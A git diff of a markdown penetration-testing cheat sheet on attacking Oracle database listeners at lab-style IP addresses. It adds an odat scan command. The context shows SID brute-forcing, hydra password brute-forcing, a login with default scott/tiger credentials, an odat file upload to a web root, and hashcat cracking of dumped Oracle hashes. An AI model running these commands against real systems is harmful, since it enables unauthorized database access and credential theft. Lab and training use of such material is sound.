@@ -22,6 +22,8 @@ nmap -p 1521 -sV --script oracle-sid-brute 10.129.2.15
 ```shell
 # Brute force SIDs using a built-in list
 odat sidguesser -s 10.129.2.15
+# OR
+./odat.py all -s 10.129.204.235
 ```
 ## 3. Authentication & Brute Force
 **Goal:** Once you have a valid SID (e.g., `XE`), find valid credentials.
@@ -47,7 +49,6 @@ hydra -L users.txt -P passwords.txt oracle-listener://10.129.2.15/XE
 **Install:** Requires Oracle Instant Client (often painful to set up).
 
 **Syntax:** `sqlplus <User>/<Pass>@<IP>/<SID>`
-
 ```shell
 # Standard Connect
 sqlplus scott/tiger@10.129.2.15/XE
@@ -99,7 +100,6 @@ odat utlfile -s 10.129.2.15 -d XE -U scott -P tiger --sysdba --putFile C:\\inetp
 **Context:** You dumped hashes from `sys.user$`.
 - **Hashcat Mode 3100:** Oracle 7-10g (DES - Weak) 
 - **Hashcat Mode 3200:** Oracle 11g (SHA1 - Medium)
-
 ```shell
 hashcat -m 3100 oracle_hashes.txt rockyou.txt
 ```
